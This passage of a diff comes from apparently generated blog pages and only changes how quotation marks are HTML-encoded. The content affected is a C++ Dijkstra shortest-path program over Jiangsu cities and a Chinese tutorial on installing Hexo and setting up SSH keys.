-printf(&amp;quot; / /_/ / / / / ,&amp;lt; (__ ) /_/ / / /_/ / \n&amp;quot;);
-printf(&amp;quot; /_____/_/_/ /_/|_/____/\\__/_/ \\__,_/ \n&amp;quot;);
-printf(&amp;quot; /___/ \n&amp;quot;);
-cout&amp;lt;&amp;lt;&amp;quot; --code by Yuuki | cc&amp;quot;&amp;lt;&amp;lt;endl;
-cout&amp;lt;&amp;lt;&amp;quot;=============================================&amp;quot;&amp;lt;&amp;lt;endl;
+system(&amp;#34;cls&amp;#34;);
+printf(&amp;#34; ____ _ _ __ __ \n&amp;#34;);
+printf(&amp;#34; / __ \(_) (_) /_______/ /__________ _\n&amp;#34;);
+printf(&amp;#34; / / / / / / / //_/ ___/ __/ ___/ __ `/\n&amp;#34;);
+printf(&amp;#34; / /_/ / / / / ,&amp;lt; (__ ) /_/ / / /_/ / \n&amp;#34;);
+printf(&amp;#34; /_____/_/_/ /_/|_/____/\\__/_/ \\__,_/ \n&amp;#34;);
+printf(&amp;#34; /___/ \n&amp;#34;);
+cout&amp;lt;&amp;lt;&amp;#34; --code by Yuuki | cc&amp;#34;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34;=============================================&amp;#34;&amp;lt;&amp;lt;endl;
 Mapprint();
-cout&amp;lt;&amp;lt;&amp;quot;=============================================&amp;quot;&amp;lt;&amp;lt;endl;
-cout&amp;lt;&amp;lt;&amp;quot; 1.录入城市路径 &amp;quot;&amp;lt;&amp;lt;endl;
-cout&amp;lt;&amp;lt;&amp;quot; 2.增加城市路径 &amp;quot;&amp;lt;&amp;lt;endl;
-cout&amp;lt;&amp;lt;&amp;quot; 3.编辑城市路径 &amp;quot;&amp;lt;&amp;lt;endl;
-cout&amp;lt;&amp;lt;&amp;quot; 4.删除城市 &amp;quot;&amp;lt;&amp;lt;endl;
-cout&amp;lt;&amp;lt;&amp;quot; 5.计算最短路径 &amp;quot;&amp;lt;&amp;lt;endl;
-cout&amp;lt;&amp;lt;&amp;quot; 0.退出 &amp;quot;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34;=============================================&amp;#34;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34; 1.录入城市路径 &amp;#34;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34; 2.增加城市路径 &amp;#34;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34; 3.编辑城市路径 &amp;#34;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34; 4.删除城市 &amp;#34;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34; 5.计算最短路径 &amp;#34;&amp;lt;&amp;lt;endl;
+cout&amp;lt;&amp;lt;&amp;#34; 0.退出 &amp;#34;&amp;lt;&amp;lt;endl;
 }
 void init(){
 N=6;
-CityList[1]=&amp;quot;南京&amp;quot;;
-CityList[2]=&amp;quot;镇江&amp;quot;;
-CityList[3]=&amp;quot;常州&amp;quot;;
-CityList[4]=&amp;quot;苏州&amp;quot;;
-CityList[5]=&amp;quot;无锡&amp;quot;;
-CityList[6]=&amp;quot;上海&amp;quot;;
+CityList[1]=&amp;#34;南京&amp;#34;;
+CityList[2]=&amp;#34;镇江&amp;#34;;
+CityList[3]=&amp;#34;常州&amp;#34;;
+CityList[4]=&amp;#34;苏州&amp;#34;;
+CityList[5]=&amp;#34;无锡&amp;#34;;
+CityList[6]=&amp;#34;上海&amp;#34;;
 map[1][2]=1;
 map[2][1]=1;
 map[2][4]=3;
@@ -4808,12 +4808,12 @@ while (true){
 logo();
 cin&amp;gt;&amp;gt;choice;
 switch(choice[0]){
-case '1': Readin(); break;
-case '2': Mapadd(); break;
-case '3': Mapmod(); break;
-case '4': Mapdel(); break;
-case '5': Dijkstra(); break;
-case '0': return 0;
+case &amp;#39;1&amp;#39;: Readin(); break;
+case &amp;#39;2&amp;#39;: Mapadd(); break;
+case &amp;#39;3&amp;#39;: Mapmod(); break;
+case &amp;#39;4&amp;#39;: Mapdel(); break;
+case &amp;#39;5&amp;#39;: Dijkstra(); break;
+case &amp;#39;0&amp;#39;: return 0;
 default:
 continue;
 }
@@ -4884,7 +4884,7 @@ Codename: Core
 &lt;p>使用node.js的npm安装hexo，这里windows可以先设置一下npm的默认安装目录，本强迫症表示你默认装在c盘我很难受。打开命令行，运行:&lt;/p>
 &lt;p>&lt;strong>坑：原教程里写了路径末尾加了node_modules，事实证明并不需要，这个命令会在目标目录生成一个node_modules。我这里设置默认安装路径在node.js本体的安装路径，因为这个路径里本身就有一个用于安装npm本身的nnode_modules文件夹。当然即使这样做了，npm运行缓存还是会存在c盘，需要继续修改设置的请移步&lt;a class="link" href="https://www.jianshu.com/p/645c758d4428" target="_blank" rel="noopener"
 >这里&lt;/a>&lt;/strong>&lt;/p>
-&lt;pre tabindex="0">&lt;code>npm config set prefix &amp;quot;E:\node.js\&amp;quot;
+&lt;pre tabindex="0">&lt;code>npm config set prefix &amp;#34;E:\node.js\&amp;#34;
 &lt;/code>&lt;/pre>&lt;ul>
 &lt;li>安装hexo
 &lt;pre tabindex="0">&lt;code>npm install -g hexo-cli
@@ -4918,7 +4918,7 @@ Codename: Core
 &lt;ul>
 &lt;li>
 &lt;p>在你的博客文件夹内运行命令&lt;/p>
-&lt;pre tabindex="0">&lt;code>hexo new &amp;quot;Hallow world&amp;quot;
+&lt;pre tabindex="0">&lt;code>hexo new &amp;#34;Hallow world&amp;#34;
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>会在source文件夹内的默认_posts文件夹下生成一个md文件，接下来就可以参照markdown语法愉快的敲代码了&lt;/p>
@@ -4952,7 +4952,7 @@ Codename: Core
 &lt;li>
 &lt;p>本地配置git生成私钥以及公钥&lt;/p>
 &lt;p>在git安装配置没有出错的情况下，环境变量完成配置，用户信息设置完全的情况下：&lt;/p>
-&lt;pre tabindex="0">&lt;code>ssh-keygen -t rsa -C &amp;quot;your_email@email.com&amp;quot;
+&lt;pre tabindex="0">&lt;code>ssh-keygen -t rsa -C &amp;#34;your_email@email.com&amp;#34;
 &lt;/code>&lt;/pre>&lt;p>该命令会在c:\user(你的电脑用户名).ssh文件加下生成密钥对。id_rsa文件为私钥，id_rsa.pub为公钥。
 &lt;strong>在后续的服务器配置过程中，我们会把公钥设置在服务器上，这样git推送的时候就可以免去密码认证&lt;/strong>&lt;/p>
 &lt;/li>
